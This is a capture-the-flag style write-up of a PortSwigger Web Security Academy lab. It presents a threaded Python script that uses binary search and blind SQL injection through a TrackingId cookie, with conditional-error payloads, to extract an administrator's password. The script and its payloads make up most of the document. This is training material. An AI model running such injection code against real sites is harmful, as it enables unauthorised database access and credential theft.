
## Web security academy
### Lab Title: Blind SQL injection with conditional errors
### Lab: 12
Extracting the password from the database using conditional errors. The program took less than (approx.) 20 seconds to extract the 20 characters password, but it also depends on the entropy of the password. Before move on to the code, I suggest checking the **REFERENCES** for **binary search, python threading, and SQLi**.

## My Points:

1. **Introduction:** <br>[Portswigger's web security academy](https://portswigger.net/) is a platform that provides practice labs for finding web application vulnerabilities. In SQL Injection ( SQLi ) section the Lab-12 where the payload sends to extract the password of a user from the database and confirm by checking the conditional errors. A lot of good work has been done by different authors, and I solved this lab using a binary search technique with multiple threads.

2. **Technique Binary Search with Multiple Threads:**
     - **Binary search:** is a searching technique in which the array splits into half in each iteration, and we only check the subarray to search our element, that's why it is faster than sequential search. This is the basic concept of binary search, and for details check the references.
     - **Threading:** let you run different tasks of your program simultaneously but it is time-based, and for details check the references.

     I combined these 2 techniques to extract the password from the database. The code is written in python3. It is a simple program only focuses on the binary search with multiple-threads, and errors are not handled. [Burp Suite](https://portswigger.net/burp) is used to check the requests and responses because it's good to check what's going on in the request/response. To run the code on windows or linux, **Python version 3** should be installed in the system and also check that the import libraries are also properly installed e.g. **request, threading**. Burp suite must be **started** to run the code.

     
     > Windows: 
     ```
     python lab-12-b-search.py
     ```
     
     > Linux:
     ```
     python3 lab-12-b-search.py
     ```


3. **Code:** <br>Assume that some of the data is already known, like password length, table name, and user name.
     - **Define main variables:**
     
        ```    
        # Burp Suite proxy
        proxy_urls = {
          'http': 'http://127.0.0.1:8080',
          'https': 'http://127.0.0.1:8080',
        }

        # Assume some of the info already known, like password length and table etc.
        password_leng = 20 # length of the password
        password_leng_range = password_leng + 1
        password = [""] * password_leng_range # ignored 0, boc name of threads start from 1

        thread_list = []
        ascii_val = [*range(48, 58), *range(97, 123)] # list of ascii values [0-9 and a-z] as per lab requirement 
        ```
        <br>
        
     - **User inputs:** When the program executes, it takes Lab URL from the user.

        ```        
        if __name__ == "__main__":
            # User input URL
            k_url = input("Enter Lab URL: ").strip().rstrip("/")

            if not k_url:
              print()
              print("[-] Error! Input variable missing.")
              print("[-] URL: https://a...........c2.web-security-academy.net")
              sys.exit()
            else:
              start_t = time()
              main()
              end_t = time()
              print("[-] Execution Time: %.5f seconds" % (end_t - start_t))
        ```     
     
        - Enter URL: Get lab URL from your browser address bar and paste it.

        - Tracking Id & Session, Code will get these 2 values from Lab URL.
    <br>

    - **Main Function:** After giving the required input the main function is called.

        ```        
        def main():
          print()
          print("[*] Processing...")

          sn = requests.Session()
          
          # Get tracking Id
          r = sn.get(k_url, proxies=proxy_urls, verify=False).cookies.get_dict()
          tracking_id = r['TrackingId']
          session_id = r['session']

          for i in range(1, password_leng_range):
            t = threading.Thread(target=send_req, name="p-%d" %i, args=(sn, i, tracking_id, session_id))
            t.start()
            thread_list.append(t)

          for j in thread_list:    
            j.join()

          print("[-] Password:", "".join(password))          
        ```
        
        The requests.Session object is created and assigned to sn, then a for loop starts from 1-20. As in each iteration of the loop, a new thread object (t) is created and then starts the thread. Each thread calls the function sen_req with parameters (sn, i {position of the password character to search}, tracking_id, session_id). Then each started thread is also stored in thread_list to further check that all the threads execution has been done using thread.join() method.
        
        <br>
    - **Binary Search method:** Each thread calls a function send_req, and 4 parameters pass in this function (sn, i, tracking_id, session_id).
        ```
        # Send request using binary method
        def send_req(sn, i, tracking_id, session_id): 

          left_p = 0
          right_p = len(ascii_val) - 1
          
          # Element not found will never happens, and loop breaks when character matches
          while True:
            mid = (left_p + right_p) // 2

            # Equal check, always match on mid
            payload = "'||(SELECT CASE WHEN  ASCII(SUBSTR(password,%d,1))=%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (i, ascii_val[mid])

            payload = urllib.parse.quote_plus(payload)

            k_cookie = {"TrackingId": tracking_id + payload, "session": session_id}
            r = sn.get(k_url, cookies=k_cookie, proxies=proxy_urls, verify=False)
            
            if r.status_code == 500:
              password[i] = chr(ascii_val[mid])
              break

            # Only check one condition, i am checking < less
            payload = "'||(SELECT CASE WHEN  ASCII(SUBSTR(password,%d,1))<%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (i, ascii_val[mid])

            payload = urllib.parse.quote_plus(payload)

            k_cookie = {"TrackingId": tracking_id + payload, "session": session_id}
            r = sn.get(k_url, cookies=k_cookie, proxies=proxy_urls, verify=False)
                       
            # left and right pointers update
            if r.status_code == 500:
              right_p = mid - 1
            else:
              left_p = mid + 1
        ```
        
        This function sets the left_p and right_p pointers of the ascii_val list, and then while loop starts with True condition because character not found will never happen and the loop will breaks when the response contains our desired response status ( **500** ).

        The main points of this function:
        1. Middle value of the list is calculated and assigned to a mid variable in each iteration of the loop.
        2. The first payload is executed to check that the extracted ascii value from the database is equal ( = ) to our ascii value ( ascii_val[mid] ).
        3. If the response is true the ascii value is converted into (chr) and assign to the password[] list, and then the while loop breaks.
        4. If the response is not true, then the second payload executes and this payload checks the extracted ascii value from the database is less ( < ) than our ascii value ( ascii_val[mid] ), and the true/false response status decides which pointer will be updated.
        
            ```
            # Only check one condition, i am checking < less
            payload = "'||(SELECT CASE WHEN  ASCII(SUBSTR(password,%d,1))<%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (i, ascii_val[mid])
            ```
            ```
            # left and right pointers update
            if r.status_code == 500:
              right_p = mid - 1
            else:
              left_p = mid + 1
            ```
            
            <br>
    - **Extracted Password:** When all the threads are done execution, the password[] list contains all the characters and then it displays on the screen.
        
        ```
        print("[-] Password:", "".join(password))
        ```
    <br>
4. **Result:** <br>Table shows the result of the lab, but time also depends on the entropy of the password.

     Password | Time (seconds)
     ---------| -------------
     3ry1dspyec9hwmf1y7tm | 11.06961 sec.


## References:
   - [https://portswigger.net/web-security/dashboard](https://portswigger.net/web-security/dashboard)
   - [https://www.khanacademy.org/computing/computer-science/algorithms/binary-search/a/binary-search](https://www.khanacademy.org/computing/computer-science/algorithms/binary-search/a/binary-search)
   - [https://realpython.com/intro-to-python-threading/](https://realpython.com/intro-to-python-threading/)
